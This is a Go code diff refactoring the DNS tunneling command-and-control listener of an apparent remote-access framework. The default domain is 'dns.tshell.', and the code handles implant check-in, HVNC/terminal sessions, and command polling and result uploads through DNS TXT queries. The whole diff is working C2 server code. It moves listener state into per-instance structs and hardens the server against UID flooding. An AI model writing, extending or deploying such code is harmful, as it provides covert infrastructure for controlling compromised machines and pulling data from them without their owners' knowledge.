@@ -17,6 +17,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"BackendTemplate/pkg/utils/logx"
@@ -35,16 +36,37 @@ import (
 //   type=rs: Result（客户端回送结果）
 //   type=hb: Heartbeat
 
-var (
-	dnsClients      = make(map[string]*dnsClientInfo) // uid -> client info
-	dnsClientsLock  sync.RWMutex
-	listenerDomain  string
-	dnsListener     *dns.Server
-	dnsCleanerOnce  sync.Once
-	resultBuffers   = make(map[string]dnsBufferEntry) // uid -> result chunks（含时间戳用于过期清理）
+// Listener 一个 DNS C2 监听器实例。原实现把这些状态全放在包级：多个 DNS 监听器会
+// 共享客户端表与分块缓冲，后启动的还会覆盖先启动的域名/前缀，两者互相串数据。
+// 现在每个实例一份。
+type Listener struct {
+	// addr 实际绑定的 UDP 地址；key 为登记用的监听器地址（listen_address）
+	addr        string
+	packetConn  net.PacketConn
+	dnsListener *dns.Server
+
+	listenerDomain string
+	dnsLabelPrefix string
+
+	dnsClients     map[string]*dnsClientInfo // uid -> client info
+	dnsClientsLock sync.RWMutex
+
+	resultBuffers   map[string]dnsBufferEntry // uid -> result chunks（含时间戳用于过期清理）
 	resultLock      sync.Mutex
-	metaInfoBuffers = make(map[string]dnsBufferEntry) // uid -> MetaInfo 注册分块
+	metaInfoBuffers map[string]dnsBufferEntry // uid -> MetaInfo 注册分块
 	metaInfoLock    sync.Mutex
+
+	dnsCleanerMu   sync.Mutex
+	dnsCleanerStop chan struct{}
+
+	stopOnce sync.Once
+	stopped  atomic.Bool
+}
+
+// listeners 已启动的 DNS 监听器（key: listen_address），供按地址停止
+var (
+	listenersMu sync.Mutex
+	listeners   = make(map[string]*Listener)
 )
 
 // XTerm/HVNC 会话广播函数，由 api 包在初始化时注入（nil 时 HandleClientReply 跳过）
@@ -63,15 +85,8 @@ const maxDNSChunks = 256
 // maxDNSChunkSize 单个分块长度上限（base32/base64 编码后实际更短）
 const maxDNSChunkSize = 512
 
-// dnsCleanerStop 停止分块缓冲/客户端缓存清理 goroutine（Stop 时关闭；
-// 重新启动监听器时重建通道并重启 goroutine，支持停止后再次启动）
-var (
-	dnsCleanerMu   sync.Mutex
-	dnsCleanerStop chan struct{}
-)
-
 // startDNSBufferCleaner 定期清理超时未完成的 DNS 分块缓冲（防止 map 无界增长）
-func startDNSBufferCleaner(stop chan struct{}) {
+func (l *Listener) startDNSBufferCleaner(stop chan struct{}) {
 	go func() {
 		for {
 			select {
@@ -80,29 +95,29 @@ func startDNSBufferCleaner(stop chan struct{}) {
 			case <-time.After(60 * time.Second):
 			}
 			cutoff := time.Now().Add(-90 * time.Second)
-			resultLock.Lock()
-			for uid, entry := range resultBuffers {
+			l.resultLock.Lock()
+			for uid, entry := range l.resultBuffers {
 				if entry.lastSeen.Before(cutoff) {
-					delete(resultBuffers, uid)
+					delete(l.resultBuffers, uid)
 				}
 			}
-			resultLock.Unlock()
-			metaInfoLock.Lock()
-			for uid, entry := range metaInfoBuffers {
+			l.resultLock.Unlock()
+			l.metaInfoLock.Lock()
+			for uid, entry := range l.metaInfoBuffers {
 				if entry.lastSeen.Before(cutoff) {
-					delete(metaInfoBuffers, uid)
+					delete(l.metaInfoBuffers, uid)
 				}
 			}
-			metaInfoLock.Unlock()
-			// 【安全修复】TTL 清理 dnsClients：离线检测器只清理已注册条目，
+			l.metaInfoLock.Unlock()
+			// 【安全修复】TTL 清理客户端缓存：离线检测器只清理已注册条目，
 			// 防止异常路径残留的无主条目无限增长（注册客户端轮询间隔 ~10s，90s 阈值安全）
-			dnsClientsLock.Lock()
-			for uid, info := range dnsClients {
+			l.dnsClientsLock.Lock()
+			for uid, info := range l.dnsClients {
 				if info.lastSeen.Before(cutoff) {
-					delete(dnsClients, uid)
+					delete(l.dnsClients, uid)
 				}
 			}
-			dnsClientsLock.Unlock()
+			l.dnsClientsLock.Unlock()
 		}
 	}()
 }
@@ -115,72 +130,97 @@ type dnsClientInfo struct {
 	lastDBWrite time.Time // 上次"在线状态写库"时间（节流用）
 }
 
-// HandleDNSConnection 启动 DNS C2 监听器
-// dnsLabelPrefix DNS 内部标签前缀（Profile dns 配置；客户端生成时同步 patch，两端必须一致）
-var dnsLabelPrefix string
-
-// SetDNSLabelPrefix 设置 DNS 标签前缀（监听器启动时由 profile 配置）
-func SetDNSLabelPrefix(p string) { dnsLabelPrefix = p }
-
 // stripLabelPrefix 去除查询名中的标签前缀（解析前还原内部标签）
-func stripLabelPrefix(tag string) string {
-	if dnsLabelPrefix != "" && len(tag) > len(dnsLabelPrefix) && strings.HasPrefix(tag, dnsLabelPrefix) {
-		return tag[len(dnsLabelPrefix):]
+func (l *Listener) stripLabelPrefix(tag string) string {
+	if l.dnsLabelPrefix != "" && len(tag) > len(l.dnsLabelPrefix) && strings.HasPrefix(tag, l.dnsLabelPrefix) {
+		return tag[len(l.dnsLabelPrefix):]
 	}
 	return tag
 }
 
-func HandleDNSConnection(addr, domain string) {
-	listenerDomain = domain
-	if listenerDomain == "" {
-		listenerDomain = "dns.tshell."
+// Start 启动一个 DNS C2 监听器实例。
+// key 用于登记/注销（即该监听器的 listen_address）；addr 是实际绑定的 UDP 地址；
+// domain / labelPrefix 来自该监听器配置与 C2 Profile（客户端生成时 patch 同一前缀，两端必须一致）。
+func Start(key, addr, domain, labelPrefix string) (*Listener, error) {
+	l := &Listener{
+		addr:            addr,
+		listenerDomain:  domain,
+		dnsLabelPrefix:  labelPrefix,
+		dnsClients:      make(map[string]*dnsClientInfo),
+		resultBuffers:   make(map[string]dnsBufferEntry),
+		metaInfoBuffers: make(map[string]dnsBufferEntry),
 	}
-	if !strings.HasSuffix(listenerDomain, ".") {
-		listenerDomain += "."
+	if l.listenerDomain == "" {
+		l.listenerDomain = "dns.tshell."
+	}
+	if !strings.HasSuffix(l.listenerDomain, ".") {
+		l.listenerDomain += "."
 	}
 
-	// 启动分块缓冲过期清理（仅当清理 goroutine 未运行时启动；支持停止后再次启动）
-	dnsCleanerMu.Lock()
-	if dnsCleanerStop == nil {
-		dnsCleanerStop = make(chan struct{})
-		startDNSBufferCleaner(dnsCleanerStop)
+	// 同步绑定 UDP：绑定失败要能返回给调用方（好让监听器状态落回已停止）。
+	// 原实现把 ListenAndServe 放在 goroutine 里，失败只打日志，库里仍是"运行中"。
+	pc, err := net.ListenPacket("udp", addr)
+	if err != nil {
+		return nil, fmt.Errorf("DNS 端口绑定失败: %w", err)
 	}
-	dnsCleanerMu.Unlock()
+	l.packetConn = pc
 
 	mux := dns.NewServeMux()
-	mux.HandleFunc(listenerDomain, handleDNSRequest)
+	mux.HandleFunc(l.listenerDomain, l.handleDNSRequest)
+	l.dnsListener = &dns.Server{PacketConn: pc, Handler: mux}
 
-	dnsListener = &dns.Server{
-		Addr:    addr,
-		Net:     "udp",
-		Handler: mux,
-	}
+	// 分块缓冲过期清理（每实例一个 goroutine）
+	l.dnsCleanerMu.Lock()
+	l.dnsCleanerStop = make(chan struct{})
+	l.startDNSBufferCleaner(l.dnsCleanerStop)
+	l.dnsCleanerMu.Unlock()
 
-	logx.Infof("🌐 [DNS监听器] 启动 DNS C2 隧道: %s, 域名: %s\n", addr, listenerDomain)
+	listenersMu.Lock()
+	listeners[key] = l
+	listenersMu.Unlock()
 
+	logx.Infof("🌐 [DNS监听器] 启动 DNS C2 隧道: %s, 域名: %s\n", addr, l.listenerDomain)
 	go func() {
-		if err := dnsListener.ListenAndServe(); err != nil {
-			logx.Errorf("❌ [DNS监听器] 启动失败: %v\n", err)
+		err := l.dnsListener.ActivateAndServe()
+		if err != nil && !l.stopped.Load() {
+			logx.Errorf("❌ [DNS监听器] %s 异常退出: %v\n", l.addr, err)
 		}
 	}()
+	return l, nil
 }
 
-// Stop 停止 DNS 监听器
-func Stop() {
-	if dnsListener != nil {
-		dnsListener.Shutdown()
+// Stop 停止该实例（幂等）
+func (l *Listener) Stop() {
+	l.stopOnce.Do(func() {
+		l.stopped.Store(true)
+		if l.dnsListener != nil {
+			_ = l.dnsListener.Shutdown()
+		}
+		if l.packetConn != nil {
+			_ = l.packetConn.Close() // Shutdown 已关闭时此处仅返回错误，忽略
+		}
+		l.dnsCleanerMu.Lock()
+		if l.dnsCleanerStop != nil {
+			close(l.dnsCleanerStop)
+			l.dnsCleanerStop = nil
+		}
+		l.dnsCleanerMu.Unlock()
+	})
+}
+
+// StopListener 停止并注销指定监听器实例（key 为 listen_address）；不存在时 no-op
+func StopListener(key string) {
+	listenersMu.Lock()
+	l := listeners[key]
+	delete(listeners, key)
+	listenersMu.Unlock()
+	if l != nil {
+		l.Stop()
 	}
-	// 停止分块缓冲/客户端缓存清理 goroutine（防泄漏；支持再次启动）
-	dnsCleanerMu.Lock()
-	if dnsCleanerStop != nil {
-		close(dnsCleanerStop)
-		dnsCleanerStop = nil
-	}
-	dnsCleanerMu.Unlock()
 }
 
 // handleDNSRequest 处理 DNS 查询
-func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
+func (l *Listener) handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
 	if len(r.Question) == 0 {
 		return
 	}
@@ -198,11 +238,11 @@ func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
 	// 解析查询名: <payload>.<type>.<seq>.<domain>
 	// rs/mi 格式: <chunk>.<idx_total>.<type>.<uid>.<domain>
 	rest := strings.TrimSuffix(q.Name, ".")
-	domainSuffix := strings.TrimSuffix(listenerDomain, ".")
+	domainSuffix := strings.TrimSuffix(l.listenerDomain, ".")
 	if strings.HasSuffix(rest, "."+domainSuffix) {
 		rest = strings.TrimSuffix(rest, "."+domainSuffix)
-	} else if strings.HasSuffix(rest, listenerDomain) {
-		rest = strings.TrimSuffix(rest, listenerDomain)
+	} else if strings.HasSuffix(rest, l.listenerDomain) {
+		rest = strings.TrimSuffix(rest, l.listenerDomain)
 	}
 	parts := strings.Split(rest, ".")
 	if len(parts) < 3 {
@@ -213,7 +253,7 @@ func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
 		return
 	}
 
-	msgType := stripLabelPrefix(parts[len(parts)-2]) // 倒数第二段是消息类型（含可配前缀）
+	msgType := l.stripLabelPrefix(parts[len(parts)-2]) // 倒数第二段是消息类型（含可配前缀）
 
 	clientIP, _, _ := net.SplitHostPort(w.RemoteAddr().String())
 
@@ -228,7 +268,7 @@ func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
 			return
 		}
 		uid := strings.Join(parts[3:], "")
-		handleResult(w, r, m, parts[0], parts[1], uid, clientIP)
+		l.handleResult(w, r, m, parts[0], parts[1], uid, clientIP)
 	case "mi":
 		// MetaInfo 注册（chunk.idx_total.mi.uid 分标签）
 		if len(parts) < 4 {
@@ -236,17 +276,17 @@ func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
 			return
 		}
 		uid := strings.Join(parts[3:], "")
-		handleMetaInfo(w, r, m, parts[0], parts[1], uid, clientIP)
+		l.handleMetaInfo(w, r, m, parts[0], parts[1], uid, clientIP)
 	default:
 		// fb/pl/hb: 标识 = uid（32 hex，单标签），分标签重组
 		uid := strings.Join(parts[:len(parts)-2], "")
 		switch msgType {
 		case "fb":
-			handleFirstBlood(w, r, m, uid, clientIP)
+			l.handleFirstBlood(w, r, m, uid, clientIP)
 		case "pl":
-			handlePull(w, r, m, uid, clientIP)
+			l.handlePull(w, r, m, uid, clientIP)
 		case "hb":
-			handleHeartbeat(w, r, m, uid, clientIP)
+			l.handleHeartbeat(w, r, m, uid, clientIP)
 		default:
 			w.WriteMsg(m)
 		}
@@ -254,12 +294,12 @@ func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
 }
 
 // handleFirstBlood 客户端上线确认（uid 直接作标识；注册/会话密钥在 mi 阶段完成）
-func handleFirstBlood(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, uid, clientIP string) {
+func (l *Listener) handleFirstBlood(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, uid, clientIP string) {
 	if uid == "" {
 		w.WriteMsg(m)
 		return
 	}
-	updateClientOnline(uid)
+	l.updateClientOnline(uid)
 
 	// 返回 success（加密）
 	successData := []byte("success")
@@ -274,7 +314,7 @@ func handleFirstBlood(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, uid, clientI
 }
 
 // registerClient 由解密后的 MetaInfo 推导 uid 并完成注册（会话密钥/映射/离线检测/数据库/通知）。
-func registerClient(metainfo []byte, clientIP string) string {
+func (l *Listener) registerClient(metainfo []byte, clientIP string) string {
 	// 【安全修复】与 TCP/KCP/WS 对齐的元数据长度校验（pid4+flag1+ip4+至少1字节OS信息），
 	// 防止短 metainfo 触发 metainfo[:4]/[5:9] 切片越界 panic
 	if len(metainfo) < 10 {
@@ -309,14 +349,14 @@ func registerClient(metainfo []byte, clientIP string) string {
 	connection.ClientListenerType[uid] = "dns"
 	connection.MuClientListenerType.Unlock()
 
-	dnsClientsLock.Lock()
-	dnsClients[uid] = &dnsClientInfo{
+	l.dnsClientsLock.Lock()
+	l.dnsClients[uid] = &dnsClientInfo{
 		uid:      uid,
 		listener: "dns",
 		ip:       clientIP,
 		lastSeen: time.Now(),
 	}
-	dnsClientsLock.Unlock()
+	l.dnsClientsLock.Unlock()
 
 	// 注册到统一离线检测器
 	if connection.GlobalOfflineDetector != nil {
@@ -336,9 +376,9 @@ func registerClient(metainfo []byte, clientIP string) string {
 			}
 		}
 		connection.GlobalOfflineDetector.Register(uid, "dns", sleepSec, func() {
-			dnsClientsLock.Lock()
-			delete(dnsClients, uid)
-			dnsClientsLock.Unlock()
+			l.dnsClientsLock.Lock()
+			delete(l.dnsClients, uid)
+			l.dnsClientsLock.Unlock()
 			// 离线时同步移除连接池条目
 			if connection.GlobalConnectionManager != nil {
 				connection.GlobalConnectionManager.RemoveConnection("dns_" + uid)
@@ -417,16 +457,16 @@ func registerClient(metainfo []byte, clientIP string) string {
 // 离线仍由统一离线检测器处理（Online:"2"）。
 const dnsDBWriteInterval = 30 * time.Second
 
-func updateClientOnline(uid string) {
+func (l *Listener) updateClientOnline(uid string) {
 	now := time.Now()
 	needDBWrite := false
 
 	// 【安全修复】未认证 UID 防注入：fb/pl/hb 端点以裸 uid 标识，攻击者可喷洒随机
-	// UID 无限增长 dnsClients。仅当 uid 已在本进程注册（或 DB 中已存在的真实客户端，
+	// UID 无限增长客户端缓存。仅当 uid 已在本进程注册（或 DB 中已存在的真实客户端，
 	// 覆盖服务端重启后重连场景）时才更新，否则直接拒绝。
 	// DB 查询放在锁外执行，避免攻击者以随机 UID 触发查询持锁造成 DoS。
-	dnsClientsLock.Lock()
-	info, ok := dnsClients[uid]
+	l.dnsClientsLock.Lock()
+	info, ok := l.dnsClients[uid]
 	if ok {
 		info.lastSeen = now
 		if now.Sub(info.lastDBWrite) >= dnsDBWriteInterval {
@@ -434,26 +474,26 @@ func updateClientOnline(uid string) {
 			needDBWrite = true
 		}
 	}
-	dnsClientsLock.Unlock()
+	l.dnsClientsLock.Unlock()
 
 	if !ok {
 		exists, _ := database.Engine.Where("uid = ?", uid).Exist(&database.Clients{})
 		if !exists {
 			return
 		}
-		dnsClientsLock.Lock()
+		l.dnsClientsLock.Lock()
 		// 双重检查：DB 查询期间可能已注册，避免覆盖更完整的信息
-		if info2, ok2 := dnsClients[uid]; ok2 {
+		if info2, ok2 := l.dnsClients[uid]; ok2 {
 			info2.lastSeen = now
 			if now.Sub(info2.lastDBWrite) >= dnsDBWriteInterval {
 				info2.lastDBWrite = now
 				needDBWrite = true
 			}
 		} else {
-			dnsClients[uid] = &dnsClientInfo{uid: uid, lastSeen: now, lastDBWrite: now}
+			l.dnsClients[uid] = &dnsClientInfo{uid: uid, lastSeen: now, lastDBWrite: now}
 			needDBWrite = true
 		}
-		dnsClientsLock.Unlock()
+		l.dnsClientsLock.Unlock()
 	}
 
 	if connection.GlobalOfflineDetector != nil {
@@ -471,7 +511,7 @@ func updateClientOnline(uid string) {
 
 // handleMetaInfo 接收客户端分块上行的加密 MetaInfo，重组后注册客户端并派生会话密钥。
 // 查询名: <chunk>.<idx_total>.mi.<uid>.<domain>
-func handleMetaInfo(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkInfo, uid, clientIP string) {
+func (l *Listener) handleMetaInfo(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkInfo, uid, clientIP string) {
 	if chunk == "" || uid == "" {
 		w.WriteMsg(m)
 		return
@@ -490,11 +530,11 @@ func handleMetaInfo(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkIn
 	}
 
 	// 聚合分块（重连时可能残留旧分块，按 total 重建）
-	metaInfoLock.Lock()
-	entry, ok := metaInfoBuffers[uid]
+	l.metaInfoLock.Lock()
+	entry, ok := l.metaInfoBuffers[uid]
 	if !ok || len(entry.chunks) != total {
-		metaInfoBuffers[uid] = dnsBufferEntry{chunks: make([][]byte, total), lastSeen: time.Now()}
-		entry = metaInfoBuffers[uid]
+		l.metaInfoBuffers[uid] = dnsBufferEntry{chunks: make([][]byte, total), lastSeen: time.Now()}
+		entry = l.metaInfoBuffers[uid]
 	}
 	entry.chunks[idx] = []byte(chunk)
 	entry.lastSeen = time.Now()
@@ -505,7 +545,7 @@ func handleMetaInfo(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkIn
 			break
 		}
 	}
-	metaInfoLock.Unlock()
+	l.metaInfoLock.Unlock()
 
 	if !complete {
 		// 等待其余分块
@@ -515,13 +555,13 @@ func handleMetaInfo(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkIn
 	}
 
 	// 全部到齐，组装
-	metaInfoLock.Lock()
+	l.metaInfoLock.Lock()
 	parts := make([]string, total)
-	for i, c := range metaInfoBuffers[uid].chunks {
+	for i, c := range l.metaInfoBuffers[uid].chunks {
 		parts[i] = string(c)
 	}
-	delete(metaInfoBuffers, uid)
-	metaInfoLock.Unlock()
+	delete(l.metaInfoBuffers, uid)
+	l.metaInfoLock.Unlock()
 	assembled := strings.Join(parts, "")
 
 	// base32 -> base64 -> 解密 -> uid -> 注册
@@ -554,14 +594,14 @@ func handleMetaInfo(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkIn
 		w.WriteMsg(m)
 		return
 	}
-	registerClient(metainfo, clientIP)
+	l.registerClient(metainfo, clientIP)
 
 	setTXTReply(m, r, "ok")
 	w.WriteMsg(m)
 }
 
 // handlePull 处理客户端轮询命令
-func handlePull(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, uid, clientIP string) {
+func (l *Listener) handlePull(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, uid, clientIP string) {
 	if uid == "" {
 		// 无标识，无法确定客户端，返回空
 		w.WriteMsg(m)
@@ -569,7 +609,7 @@ func handlePull(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, uid, clientIP stri
 	}
 
 	// uid 直接作标识（不再每轮携带 MetaInfo）
-	updateClientOnline(uid)
+	l.updateClientOnline(uid)
 
 	// 【会话密钥唯一化】优先下发暂存的 nonce 协商消息（命令留待下轮）
 	// 编码与命令下发一致：base32(密文)（BuildSessionNonceMsgWithKey 返回 base64，先解码回密文）
@@ -621,14 +661,14 @@ func handlePull(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, uid, clientIP stri
 }
 
 // handleResult 处理客户端回送结果
-func handleResult(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkInfo, uid, clientIP string) {
+func (l *Listener) handleResult(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkInfo, uid, clientIP string) {
 	if chunk == "" || uid == "" {
 		w.WriteMsg(m)
 		return
 	}
 
 	// uid 直接作标识（不再解密 MetaInfo）
-	updateClientOnline(uid)
+	l.updateClientOnline(uid)
 
 	// 解析分块信息 idx_total
 	var idx, total int
@@ -643,13 +683,13 @@ func handleResult(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkInfo
 	}
 
 	// 聚合分块
-	resultLock.Lock()
+	l.resultLock.Lock()
 	// 与 mi 聚合一致：缓冲长度必须匹配当前消息的 total，否则残留块（UDP 重传等）
 	// 会污染新消息（误判完成/越界）。长度不符时丢弃重建。
-	entry, ok := resultBuffers[uid]
+	entry, ok := l.resultBuffers[uid]
 	if !ok || len(entry.chunks) != total {
-		resultBuffers[uid] = dnsBufferEntry{chunks: make([][]byte, total), lastSeen: time.Now()}
-		entry = resultBuffers[uid]
+		l.resultBuffers[uid] = dnsBufferEntry{chunks: make([][]byte, total), lastSeen: time.Now()}
+		entry = l.resultBuffers[uid]
 	}
 	entry.chunks[idx] = []byte(chunk)
 	entry.lastSeen = time.Now()
@@ -660,7 +700,7 @@ func handleResult(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkInfo
 			break
 		}
 	}
-	resultLock.Unlock()
+	l.resultLock.Unlock()
 
 	if !complete {
 		// 等待其余分块
@@ -670,13 +710,13 @@ func handleResult(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkInfo
 	}
 
 	// 全部到齐，组装
-	resultLock.Lock()
+	l.resultLock.Lock()
 	parts := make([]string, total)
-	for i, c := range resultBuffers[uid].chunks {
+	for i, c := range l.resultBuffers[uid].chunks {
 		parts[i] = string(c)
 	}
-	delete(resultBuffers, uid)
-	resultLock.Unlock()
+	delete(l.resultBuffers, uid)
+	l.resultLock.Unlock()
 	assembled := strings.Join(parts, "")
 
 	// 解码 + 解密
@@ -714,24 +754,16 @@ func handleResult(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkInfo
 }
 
 // handleHeartbeat 处理心跳
-func handleHeartbeat(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, uid, clientIP string) {
+func (l *Listener) handleHeartbeat(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, uid, clientIP string) {
 	if uid == "" {
 		w.WriteMsg(m)
 		return
 	}
 	// uid 直接作标识
-	updateClientOnline(uid)
+	l.updateClientOnline(uid)
 
 	setTXTReply(m, r, "ok")
 	w.WriteMsg(m)
-}
-
-// SendCommand 通过 DNS 隧道下发命令（放入命令队列，客户端轮询时取走）
-func SendCommand(uid string, cmdBytes []byte) {
-	// 【背压】队列满时告警放弃（不再静默丢最旧导致分块损坏）
-	if !command.CommandQueues.AddCommand(uid, cmdBytes) {
-		logx.Warnf("⚠️ [DNS] 命令队列已满，丢弃命令: uid=%s\n", uid)
-	}
 }
 
 // setTXTReply 设置 TXT 响应
